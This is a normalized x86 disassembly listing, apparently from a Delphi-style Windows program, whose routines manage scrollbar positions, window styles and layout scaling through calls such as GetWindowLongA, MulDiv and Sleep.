mov eax [ eax + 0x4 ]
mov edx esi
call sub_43bf1c
call sub_44f97c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_44fafc
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_43f228
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44fb34
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43f228
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_44fb68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_44fb34
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_44fb34
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_44fbe4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43f228
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_44fb68
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_438444
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_44fb68
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_438488
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_44fc7c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43f228
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_44fcdc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_44fead ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_45004c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_45004c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44fbe4
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_45004c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44fbe4
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45004c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45004c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_45004c
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_45004c
jmp r-xdata
push ebp
call sub_44fc7c
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45004c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_45004c
jmp r-xdata
push ebp
call sub_44fc7c
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45004c
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406848
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45004c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45004c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45004c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45004c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45004c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45004c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45004c
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45004c
jmp r-xdata
sub_44ffd4
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_4506c4
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_45004c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_43f228
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_43f228
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_43ede0
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_43ede0
jmp r-xdata
call sub_44f7bc
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_450110
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_4506c4
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_4501c8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43f228
push eax
call sub_423b2c
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43f228
push eax
call sub_423b2c
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43f228
push eax
call sub_423b2c
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_41bd24
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43f228
push eax
call sub_423b2c
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43f228
push eax
call sub_423b2c
sub_4502d0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_44fbe4
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_44fbe4
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_4501c8
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43f228
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_45004c
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_44fbe4
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_4503e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43af54
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44f864
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44f864
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_450460
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403258
mov eax [ esi + 0x20c ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43b078
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_4504ac
push ebx
mov ebx eax
mov eax ebx
call sub_43c1e0
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_4506c4
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40bab4
test al al
jne r-xdata
mov eax ebx
call sub_43f228
push eax
call sub_423b60
sub_4504ec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_450644
mov ecx edi
mov edx esi
mov eax ebx
call sub_43b928
pop edi
pop esi
pop ebx
retn
sub_45052c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_450634
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_438444
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_44fafc
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_43bf58
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_45004c
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43bf1c
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43bf1c
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_413650
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_4381b0
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45063b
mov eax [ ebp - 0x10 ]
call sub_403258
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44f944
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_4137ac
xor ecx ecx
mov edx 0xb03e
call sub_439bf4
inc ebx
dec esi
jne r-xdata
sub_450668
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_45019c
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_45019c
mov eax ebx
call sub_450644
jmp r-xdata
sub_4506c4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43f52c
test al al
je r-xdata
xor eax eax
push ebp
push sub_4507af
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_44fc64
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44fc64
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_4502d0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_4502d0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_4502d0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_4502d0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_4502d0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_4502d0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_4507d4
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_438558
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_438584
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_438558
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_438584
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_438444
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_45004c
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_438444
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_438488
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_45004c
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_438444
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_45004c
mov eax ebx
call sub_438444
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_438488
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_438488
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_45004c
mov eax ebx
call sub_438488
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_450928
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_45004c
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_45004c
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_45019c
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_45019c
sub_4509cc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_450928
mov ecx edi
mov edx esi
mov eax ebx
call sub_43ed34
pop edi
pop esi
pop ebx
retn
sub_4509f4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_450a5e
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43d814
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450a65
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_450a65
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_450a9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_450644
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450aa4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_450aa4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4506c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_450b18
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_438488
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_421f0c
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_438444
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_421f0c
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_4123a0
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_43b294
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_450b88
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_450be9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4033e4
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43e5a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450bf0
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_450c18
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_450d7c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_450d5c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_4031a0
cmp eax [ r-xdata ]
